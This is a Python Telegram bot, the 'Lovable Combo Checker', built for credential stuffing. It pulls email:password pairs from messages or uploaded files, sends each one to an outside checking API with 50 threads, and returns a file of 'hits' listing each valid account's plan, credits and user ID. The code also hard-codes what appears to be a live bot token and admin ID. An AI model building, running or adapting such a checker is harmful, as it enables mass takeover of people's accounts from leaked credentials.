import os
import re
import io
import time
import asyncio
import requests
import telebot
from telebot import types
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== CONFIG ====================
BOT_TOKEN = "8382176494:AAGGObf-R9Z1BGXTgKst-u7UvT1BSIRCVms"
ADMIN_ID = 7240767926
CREDIT = "@ZYELEO"

# Add as many API base URLs as you want here for fast checking
API_BASES = [
    "https://loveblecombo.onrender.com",
    # "https://your-second-api.onrender.com",
    # "https://your-third-api.onrender.com",
]

MAX_THREADS = 50
bot = telebot.TeleBot(BOT_TOKEN)
api_idx = 0

# ==================== HELPERS ====================
def get_next_api():
    global api_idx
    url = API_BASES[api_idx % len(API_BASES)]
    api_idx += 1
    return url.rstrip("/")

def check_combo(combo):
    """Sends combo to the API and returns JSON."""
    url = f"{get_next_api()}/lovable?combo={combo}"
    try:
        r = requests.get(url, timeout=30)
        if r.status_code == 200:
            return combo, r.json()
        return combo, {"status": "error", "reason": f"HTTP {r.status_code}"}
    except Exception as e:
        return combo, {"status": "error", "reason": str(e)[:50]}

def parse_combos(text):
    """Extracts user:pass from text."""
    pattern = re.compile(r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}):([^\s|,;>"\']+)')
    combos = set()
    for match in pattern.finditer(text):
        combos.add(f"{match.group(1).lower()}:{match.group(2)}")
    return list(combos)

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def start(message):
    text = (
        "🛡️ **Lovable Combo Checker**\n\n"
        "**Commands:**\n"
        "• `/chk user:pass` → Check single combo\n"
        "• Reply to a `.txt` file with `/chk` → Check bulk combos\n\n"
        f"💠 {CREDIT}"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['chk'])
def handle_chk(message):
    # Check if replying to a file
    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        file_name = doc.file_name or "combo.txt"
        
        if doc.file_size > 20 * 1024 * 1024:
            bot.reply_to(message, "❌ File too large for Bot API (Max 20MB).")
            return
            
        msg = bot.reply_to(message, f"⏳ Downloading `{file_name}`...", parse_mode='Markdown')
        
        try:
            file_info = bot.get_file(doc.file_id)
            downloaded = bot.download_file(file_info.file_path)
            content = downloaded.decode('utf-8', errors='ignore')
            
            combos = parse_combos(content)
            if not combos:
                bot.edit_message_text("❌ No valid combos found in file.", chat_id=msg.chat.id, message_id=msg.message_id)
                return
                
            bot.edit_message_text(f"🚀 Checking **{len(combos):,}** combos with {MAX_THREADS} threads...", chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
            
            # Process in background so bot doesn't freeze
            asyncio.run_coroutine_threadsafe(
                process_bulk(msg, combos),
                bot.loop
            )
            
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", chat_id=msg.chat.id, message_id=msg.message_id)
        return

    # Check single combo from text
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or ":" not in parts[1]:
        bot.reply_to(message, "❌ **Usage:** `/chk user@gmail.com:password` or reply to a file.", parse_mode='Markdown')
        return
        
    combo = parts[1].strip()
    msg = bot.reply_to(message, f"🔍 Checking `{combo}`...", parse_mode='Markdown')
    
    _, result = check_combo(combo)
    
    status = result.get("status", "error").upper()
    plan = result.get("plan", "-")
    credits = result.get("credits", 0)
    reason = result.get("reason", "-")
    
    if status == "HIT":
        emoji = "✅"
        extra = f"Plan: `{plan}`\nCredits: `{credits}`\nUID: `{result.get('uid')}`"
    elif status == "BAD":
        emoji = "❌"
        extra = f"Reason: `{reason}`"
    else:
        emoji = "⚠️"
        extra = f"Reason: `{reason}`"

    text = (
        f"{emoji} **Status:** `{status}`\n"
        f"📧 Combo: `{combo}`\n"
        f"{extra}\n\n"
        f"💠 {CREDIT}"
    )
    bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

async def process_bulk(msg, combos):
    """Handles bulk checking with progress bar."""
    total = len(combos)
    checked = 0
    hits = 0
    bad = 0
    errors = 0
    
    hits_file = io.StringIO()
    bad_file = io.StringIO()
    
    start_time = time.time()
    last_update = time.time()
    
    loop = asyncio.get_event_loop()
    
    def update_progress():
        nonlocal last_update
        if time.time() - last_update > 2.5 or checked == total: # Update every 2.5s
            last_update = time.time()
            pct = int((checked / total) * 100)
            bar = "█" * int(pct / 10) + "░" * (10 - int(pct / 10))
            elapsed = int(time.time() - start_time)
            cpm = int(checked / (elapsed / 60)) if elapsed > 0 else 0
            
            text = (
                f"🚀 **Checking Combos**\n\n"
                f"`[{bar}]` {pct}%\n"
                f"📊 Checked: **{checked:,}** / {total:,}\n"
                f"✅ Hits: **{hits:,}** | ❌ Bad: **{bad:,}**\n"
                f"⚠️ Errors: **{errors:,}**\n"
                f"⚡ Speed: {cpm:,} CPM | ⏱️ Time: {elapsed}s"
            )
            try:
                bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
            except Exception:
                pass # Ignore rate limits on message editing

    # Use ThreadPoolExecutor for concurrency
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as pool:
        futures = {pool.submit(check_combo, c): c for c in combos}
        
        for future in as_completed(futures):
            combo, result = future.result()
            status = result.get("status")
            
            checked += 1
            if status == "hit":
                hits += 1
                plan = result.get("plan", "-")
                credits = result.get("credits", 0)
                uid = result.get("uid", "-")
                hits_file.write(f"{combo} | {plan} | credits={credits} | uid={uid}\n")
            elif status == "bad":
                bad += 1
                bad_file.write(f"{combo}\n")
            else:
                errors += 1
                
            # Update UI asynchronously
            if checked % 10 == 0 or checked == total:
                await loop.run_in_executor(None, update_progress)

    # Final Summary
    elapsed = int(time.time() - start_time)
    summary = (
        f"✅ **Check Complete!**\n\n"
        f"📊 Total: **{total:,}**\n"
        f"✅ Hits: **{hits:,}**\n"
        f"❌ Bad: **{bad:,}**\n"
        f"⚠️ Errors: **{errors:,}**\n"
        f"⏱️ Time: {elapsed}s\n\n"
        f"💠 {CREDIT}"
    )
    bot.edit_message_text(summary, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

    # Send Hits File
    if hits > 0:
        hits_file.seek(0)
        bot.send_document(
            msg.chat.id,
            (f"hits_{int(time.time())}.txt", hits_file.getvalue().encode()),
            caption=f"✅ **{hits:,} Hits**\n💠 {CREDIT}",
            parse_mode='Markdown'
        )

    # Send Bad File
    if bad > 0:
        bad_file.seek(0)
        bot.send_document(
            msg.chat.id,
            (f"bad_{int(time.time())}.txt", bad_file.getvalue().encode()),
            caption=f"❌ **{bad:,} Bad**\n💠 {CREDIT}",
            parse_mode='Markdown'
        )

if __name__ == "__main__":
    print("Starting Lovable Checker Bot...")
    bot.infinity_polling()
